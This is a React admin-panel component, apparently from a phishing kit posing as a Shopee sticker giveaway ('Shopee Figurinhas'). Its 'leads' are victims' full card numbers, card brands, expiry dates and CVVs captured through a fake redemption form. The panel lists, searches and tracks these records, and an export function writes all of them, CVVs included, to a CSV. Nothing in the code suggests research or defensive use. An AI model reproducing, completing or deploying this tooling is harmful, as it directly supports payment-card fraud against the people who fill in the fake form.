import React, { useState } from 'react';
import {
  X,
  Users,
  Search,
  Download,
  Trash2,
  CheckCircle2,
  Clock,
  PhoneCall,
  ExternalLink,
  Filter,
} from 'lucide-react';

export interface Lead {
  id: string;
  nome: string;
  numeroCartao: string;
  bandeira: string;
  validade: string;
  cvv: string;
  dataCadastro: string;
  status: 'Novo' | 'Contatado' | 'Resgatado';
}

interface AdminPanelModalProps {
  isOpen: boolean;
  onClose: () => void;
  leads: Lead[];
  onUpdateStatus: (id: string, newStatus: Lead['status']) => void;
  onDeleteLead: (id: string) => void;
  onClearAllLeads: () => void;
}

export const AdminPanelModal: React.FC<AdminPanelModalProps> = ({
  isOpen,
  onClose,
  leads,
  onUpdateStatus,
  onDeleteLead,
  onClearAllLeads,
}) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<'Todos' | Lead['status']>('Todos');

  if (!isOpen) return null;

  // Filter leads
  const filteredLeads = leads.filter((lead) => {
    const matchesSearch =
      lead.nome.toLowerCase().includes(searchTerm.toLowerCase()) ||
      lead.numeroCartao.toLowerCase().includes(searchTerm.toLowerCase()) ||
      lead.validade.includes(searchTerm);
    const matchesStatus = statusFilter === 'Todos' || lead.status === statusFilter;
    return matchesSearch && matchesStatus;
  });

  // Export to CSV
  const handleExportCSV = () => {
    if (leads.length === 0) return;
    const headers = ['ID', 'Nome', 'Cartão', 'Bandeira', 'Validade', 'CVV', 'Data Cadastro', 'Status'];
    const rows = leads.map((l) => [
      `"${l.id}"`,
      `"${l.nome}"`,
      `"${l.numeroCartao}"`,
      `"${l.bandeira}"`,
      `"${l.validade}"`,
      `"${l.cvv}"`,
      `"${l.dataCadastro}"`,
      `"${l.status}"`,
    ]);
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((e) => e.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `leads_shopee_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const totalLeads = leads.length;
  const newLeads = leads.filter((l) => l.status === 'Novo').length;
  const contactedLeads = leads.filter((l) => l.status === 'Contatado').length;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-5 bg-black/80 backdrop-blur-xs select-none">
      <div className="bg-white rounded-3xl w-full max-w-4xl max-h-[92vh] flex flex-col overflow-hidden shadow-2xl border-4 border-slate-800 animate-in zoom-in-95 duration-150">
        
        {/* Header */}
        <div className="bg-slate-900 text-white p-5 flex items-center justify-between shrink-0">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-orange-500/20 text-orange-400 flex items-center justify-center border border-orange-500/30">
              <Users className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="font-black text-lg">Painel de Leads & Controle</h3>
                <span className="bg-orange-500 text-white text-[10px] font-black px-2 py-0.5 rounded-full uppercase">
                  Admin
                </span>
              </div>
              <p className="text-xs text-slate-400">
                Gerencie os contatos captados na campanha Shopee Figurinhas
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-full hover:bg-slate-800 text-slate-400 hover:text-white transition-colors cursor-pointer"
          >
            <X className="w-6 h-6" />
          </button>
        </div>

        {/* Top KPI Cards */}
        <div className="p-4 sm:p-6 bg-slate-50 border-b border-slate-200 grid grid-cols-3 gap-3 shrink-0">
          <div className="bg-white p-3.5 rounded-2xl border border-slate-200 shadow-2xs flex items-center justify-between">
            <div>
              <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider block">
                Total de Leads
              </span>
              <span className="text-2xl font-black text-slate-900">{totalLeads}</span>
            </div>
            <div className="w-9 h-9 rounded-xl bg-blue-50 text-blue-600 flex items-center justify-center">
              <Users className="w-4 h-4" />
            </div>
          </div>

          <div className="bg-white p-3.5 rounded-2xl border border-slate-200 shadow-2xs flex items-center justify-between">
            <div>
              <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider block">
                Novos (Pendentes)
              </span>
              <span className="text-2xl font-black text-amber-600">{newLeads}</span>
            </div>
            <div className="w-9 h-9 rounded-xl bg-amber-50 text-amber-600 flex items-center justify-center">
              <Clock className="w-4 h-4" />
            </div>
          </div>

          <div className="bg-white p-3.5 rounded-2xl border border-slate-200 shadow-2xs flex items-center justify-between">
            <div>
              <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider block">
                Contatados
              </span>
              <span className="text-2xl font-black text-emerald-600">{contactedLeads}</span>
            </div>
            <div className="w-9 h-9 rounded-xl bg-emerald-50 text-emerald-600 flex items-center justify-center">
              <CheckCircle2 className="w-4 h-4" />
            </div>
          </div>
        </div>

        {/* Actions Bar: Search, Filter, Export */}
        <div className="p-4 flex flex-col sm:flex-row items-center justify-between gap-3 border-b border-slate-200 bg-white shrink-0">
          <div className="flex items-center gap-2 w-full sm:w-auto">
            {/* Search Input */}
            <div className="relative w-full sm:w-64">
              <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
              <input
                type="text"
                placeholder="Buscar por nome, e-mail..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pl-9 pr-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-800 focus:outline-none focus:border-slate-800"
              />
            </div>

            {/* Filter Status */}
            <div className="flex items-center gap-1">
              <Filter className="w-3.5 h-3.5 text-slate-400" />
              <select
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value as any)}
                className="bg-slate-50 border border-slate-200 text-xs rounded-xl px-2.5 py-2 font-medium text-slate-700 focus:outline-none cursor-pointer"
              >
                <option value="Todos">Todos</option>
                <option value="Novo">Novos</option>
                <option value="Contatado">Contatados</option>
                <option value="Resgatado">Resgatados</option>
              </select>
            </div>
          </div>

          {/* Export / Clear buttons */}
          <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
            <button
              onClick={handleExportCSV}
              disabled={leads.length === 0}
              className={`flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-bold transition-all ${
                leads.length > 0
                  ? 'bg-slate-900 text-white hover:bg-slate-800 cursor-pointer shadow-xs active:scale-95'
                  : 'bg-slate-100 text-slate-400 cursor-not-allowed'
              }`}
            >
              <Download className="w-3.5 h-3.5" />
              <span>Exportar CSV</span>
            </button>

            {leads.length > 0 && (
              <button
                onClick={() => {
                  if (confirm('Tem certeza de que deseja apagar todos os leads captados?')) {
                    onClearAllLeads();
                  }
                }}
                className="p-2 text-red-600 hover:bg-red-50 rounded-xl transition-colors cursor-pointer"
                title="Limpar todos os registros"
              >
                <Trash2 className="w-4 h-4" />
              </button>
            )}
          </div>
        </div>

        {/* Leads Table */}
        <div className="flex-1 overflow-y-auto p-4">
          {filteredLeads.length === 0 ? (
            <div className="text-center py-16 text-slate-400">
              <Users className="w-12 h-12 mx-auto mb-3 opacity-40" />
              <h4 className="font-bold text-slate-700 text-sm">Nenhum lead encontrado</h4>
              <p className="text-xs text-slate-400 max-w-xs mx-auto mt-1">
                {leads.length === 0
                  ? 'Quando os usuários preencherem o formulário de resgate, os contatos aparecerão aqui automaticamente.'
                  : 'Nenhum lead corresponde aos filtros pesquisados.'}
              </p>
            </div>
          ) : (
            <div className="border border-slate-200 rounded-2xl overflow-hidden shadow-2xs">
              <table className="w-full text-left text-xs">
                <thead className="bg-slate-100 text-slate-600 font-bold border-b border-slate-200">
                  <tr>
                    <th className="py-3 px-4">Data/Hora</th>
                    <th className="py-3 px-4">Nome</th>
                    <th className="py-3 px-4">Cartão</th>
                    <th className="py-3 px-4">Bandeira</th>
                    <th className="py-3 px-4">Val.</th>
                    <th className="py-3 px-4">CVV</th>
                    <th className="py-3 px-4">Status</th>
                    <th className="py-3 px-4 text-right">Ação</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 text-slate-700">
                  {filteredLeads.map((lead) => {
                    return (
                      <tr key={lead.id} className="hover:bg-slate-50/70 transition-colors">
                        <td className="py-3 px-4 text-slate-400 font-medium whitespace-nowrap">
                          {lead.dataCadastro}
                        </td>
                        <td className="py-3 px-4 font-bold text-slate-900 whitespace-nowrap">
                          {lead.nome}
                        </td>
                        <td className="py-3 px-4 text-slate-600 font-mono text-[11px]">
                          {lead.numeroCartao}
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap text-xs font-bold text-slate-700">
                          {lead.bandeira}
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap">
                          {lead.validade}
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap text-slate-600 font-mono text-[11px]">
                          {lead.cvv}
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap">
                          <select
                            value={lead.status}
                            onChange={(e) => onUpdateStatus(lead.id, e.target.value as any)}
                            className={`text-[11px] font-bold rounded-lg px-2 py-1 border cursor-pointer ${
                              lead.status === 'Novo'
                                ? 'bg-amber-50 text-amber-700 border-amber-200'
                                : lead.status === 'Contatado'
                                ? 'bg-blue-50 text-blue-700 border-blue-200'
                                : 'bg-emerald-50 text-emerald-700 border-emerald-200'
                            }`}
                          >
                            <option value="Novo">Novo</option>
                            <option value="Contatado">Contatado</option>
                            <option value="Resgatado">Resgatado</option>
                          </select>
                        </td>
                        <td className="py-3 px-4 text-right whitespace-nowrap">
                          <button
                            onClick={() => onDeleteLead(lead.id)}
                            className="p-1 text-slate-400 hover:text-red-600 transition-colors cursor-pointer"
                            title="Excluir lead"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="p-3.5 bg-slate-100 border-t border-slate-200 flex items-center justify-between text-[11px] text-slate-500 shrink-0">
          <span>Armazenamento local persistente ativo</span>
          <button
            onClick={onClose}
            className="px-4 py-1.5 bg-slate-900 hover:bg-slate-800 text-white rounded-xl font-bold cursor-pointer transition-colors"
          >
            Fechar Painel
          </button>
        </div>

      </div>
    </div>
  );
};
